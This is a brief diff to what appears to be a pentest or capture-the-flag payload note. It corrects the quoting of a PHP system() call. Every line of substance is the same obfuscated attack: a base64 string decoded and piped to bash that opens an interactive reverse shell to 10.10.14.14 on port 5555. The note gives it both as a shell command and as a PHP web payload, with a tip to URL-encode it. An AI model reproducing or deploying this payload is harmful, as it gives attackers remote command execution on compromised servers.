@@ -22,5 +22,5 @@ Final payload: (Dont forget to URL encode)
 echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo= | base64 -d | bash
 
 If you need to payload to be executed with PHP:
-<?php system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo= | base64 -d | bash ?>
+<?php system("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE0LzU1NTUgMD4mMQo= | base64 -d | bash") ?>
 ```
